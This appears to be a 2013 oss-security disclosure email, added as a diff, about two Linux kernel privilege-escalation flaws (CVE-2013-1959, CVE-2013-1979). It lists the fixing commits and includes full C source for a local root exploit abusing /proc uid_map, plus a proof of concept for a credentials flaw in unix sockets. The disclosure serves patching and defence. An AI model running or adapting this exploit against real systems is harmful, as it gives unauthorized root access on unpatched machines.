@@ -1,0 +1,247 @@
+
+Date: Sun, 28 Apr 2013 19:23:46 -0700
+From: Andy Lutomirski <luto@...capital.net>
+To: linux-kernel@...r.kernel.org, oss-security@...ts.openwall.com
+Subject: Multiple Linux setuid output redirection vulnerabilities
+
+Some of the recent -stable patches are (surprise!) security fixes.
+These were disclosed on the distros list last week.
+
+CVE-2013-1959: /proc/<pid>/uid_map has multiple incorrect privilege checks
+
+Linux 3.8 and various 3.9 rcs are affected, depending on
+configuration.  This gives a root shell.  (Actually, it gives a uid 0
+shell with no capabilities, but that's easy to escalate to full root.)
+
+Fixed by:
+
+commit 935d8aabd4331f47a89c3e1daa5779d23cf244ee
+Author: Linus Torvalds <torvalds@...ux-foundation.org>
+Date:   Sun Apr 14 10:06:31 2013 -0700
+
+    Add file_ns_capable() helper function for open-time capability checking
+
+commit 6708075f104c3c9b04b23336bb0366ca30c3931b
+Author: Eric W. Biederman <ebiederm@...ssion.com>
+Date:   Sun Apr 14 13:47:02 2013 -0700
+
+    userns: Don't let unprivileged users trick privileged users into
+setting the id_map
+
+commit e3211c120a85b792978bcb4be7b2886df18d27f0
+Author: Andy Lutomirski <luto@...capital.net>
+Date:   Sun Apr 14 16:28:19 2013 -0700
+
+    userns: Check uid_map's opener's fsuid, not the current fsuid
+
+All three patches are needed.
+
+
+There's an exploit at the bottom of this email.  To use it, you need
+to supply the program "zerozeroone".  Doing so is left as an exercise
+to the reader.  It can be done on stock installs of Fedora and Ubuntu
+at least.
+
+
+
+CVE-2013-1979: writes to unix sockets capture euid instead of uid
+
+This appears to be a regression in 2.6.36, and the regression was
+backported to various older stable series (2.6.35.11 at least).  It is
+almost certainly exploitable for root on most distributions, although
+the vectors will vary.  The fix is:
+
+commit 83f1b4ba917db5dc5a061a44b3403ddb6e783494
+Author: Linus Torvalds <torvalds@...ux-foundation.org>
+Date:   Fri Apr 19 15:32:32 2013 +0000
+
+    net: fix incorrect credentials passing
+
+
+I don't have an exploit, but there's a PoC below that demonstrates the issue.
+
+
+
+There's another security buglet that probably has extremely low
+impact.  It doesn't have (and shouldn't need) a CVE number.  It's
+fixed here:
+
+commit 41c21e351e79004dbb4efa4bc14a53a7e0af38c5
+Author: Andy Lutomirski <luto@...capital.net>
+Date:   Sun Apr 14 11:44:04 2013 -0700
+
+    userns: Changing any namespace id mappings should require privileges
+
+
+
+--- Begin CVE-2013-1959 exploit ---
+/* userns_root_sploit.c by */
+/* Copyright (c) 2013 Andrew Lutomirski.  All rights reserved. */
+/* You may use, modify, and redistribute this code under the GPLv2. */
+
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <sched.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <string.h>
+#include <err.h>
+#include <linux/futex.h>
+#include <errno.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+
+#ifndef CLONE_NEWUSER
+#define CLONE_NEWUSER 0x10000000
+#endif
+
+pid_t parent;
+int *ftx;
+
+int childfn()
+{
+  int fd;
+  char buf[128];
+
+  if (syscall(SYS_futex, ftx, FUTEX_WAIT, 0, 0, 0, 0) == -1 &&
+      errno != EWOULDBLOCK)
+    err(1, "futex");
+
+  sprintf(buf, "/proc/%ld/uid_map", (long)parent);
+  fd = open(buf, O_RDWR | O_CLOEXEC);
+  if (fd == -1)
+    err(1, "open %s", buf);
+  if (dup2(fd, 1) != 1)
+    err(1, "dup2");
+
+  // Write something like "0 0 1" to stdout with elevated capabilities.
+  execl("./zerozeroone", "./zerozeroone");
+
+  return 0;
+}
+
+int main(int argc, char **argv)
+{
+  int dummy, status;
+  pid_t child;
+
+  if (argc < 2) {
+    printf("usage: userns_root_sploit COMMAND ARGS...\n\n"
+           "This will run a command as (global) uid 0 but no capabilities.\n");
+    return 1;
+  }
+
+  ftx = mmap(0, sizeof(int), PROT_READ | PROT_WRITE,
+             MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+  if (ftx == MAP_FAILED)
+    err(1, "mmap");
+
+  parent = getpid();
+
+  if (signal(SIGCHLD, SIG_DFL) != 0)
+    err(1, "signal");
+
+  child = fork();
+  if (child == -1)
+    err(1, "fork");
+  if (child == 0)
+    return childfn();
+
+  *ftx = 1;
+  if (syscall(SYS_futex, ftx, FUTEX_WAKE, 1, 0, 0, 0) != 0)
+    err(1, "futex");
+
+  if (unshare(CLONE_NEWUSER) != 0)
+    err(1, "unshare(CLONE_NEWUSER)");
+
+  if (wait(&status) != child)
+    err(1, "wait");
+  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
+    errx(1, "child failed");
+
+  if (setresuid(0, 0, 0) != 0)
+    err(1, "setresuid");
+  execvp(argv[1], argv+1);
+  err(1, argv[1]);
+
+  return 0;
+}
+--- End CVE-2013-1959 exploit ---
+
+--- Begin CVE-2013-1979 PoC ---
+/* socket_problem.c - PoC for an SCM_CREDENTIALS issue
+ *
+ * Actually exploiting something is left as an exercise for the reader.
+ *
+ * Copyright (c) 2013 Andrew Lutomirski.  All rights reserved.
+ * You may use, modify, and redistribute this code under the GPLv2.
+ */
+
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <stdio.h>
+#include <string.h>
+#include <err.h>
+#include <unistd.h>
+
+int child(int fd)
+{
+  if (dup2(fd, 2) != 2)
+    err(1, "dup2");
+  execlp("su", "evil payload\n", "-U", "nonexistentuser", NULL);
+  err(1, "execlp");
+  return 1;
+}
+
+int main()
+{
+  printf("[PoC for an SCM_CREDENTIALS issue]\n");
+  int sockets[2];
+  if (socketpair(AF_UNIX, SOCK_SEQPACKET, 0, sockets) != 0)
+    err(1, "socketpair");
+
+  int one = 1;
+  if (setsockopt(sockets[0], SOL_SOCKET, SO_PASSCRED, &one, sizeof(one)) != 0)
+    err(1, "SO_PASSCRED");
+
+  if (fork() == 0)
+    return child(sockets[1]);
+
+  char buf[4097];
+  char cbuf[CMSG_SPACE(sizeof(struct ucred))];
+  struct iovec iov;
+  iov.iov_base = &buf;
+  iov.iov_len = sizeof(buf);
+  struct msghdr hdr;
+  memset(&hdr, 0, sizeof(hdr));
+  hdr.msg_iov = &iov;
+  hdr.msg_iovlen = 1;
+  hdr.msg_control = cbuf;
+  hdr.msg_controllen = sizeof(cbuf);
+  ssize_t bytes = recvmsg(sockets[0], &hdr, 0);
+  if (bytes < 0)
+    err(1, "recvmsg");
+
+  printf("Received %ld bytes\n", (long)bytes);
+
+  for (struct cmsghdr *cmsg = CMSG_FIRSTHDR(&hdr); cmsg; cmsg =
+CMSG_NXTHDR(&hdr, cmsg)) {
+    if (cmsg->cmsg_level == SOL_SOCKET &&
+        cmsg->cmsg_type == SCM_CREDENTIALS) {
+      struct ucred *cred = (struct ucred *)CMSG_DATA(cmsg);
+      printf("SCM_CREDENTIALS: uid=%ld, gid=%ld, pid=%ld\n",
+             (long)cred->uid, (long)cred->gid, (long)cred->pid);
+    }
+  }
+
+  buf[bytes] = 0;
+  printf("Payload: %s\n[PoC exiting]\n", buf);
+  return 0;
+}
+--- End CVE-2013-1979 PoC ---
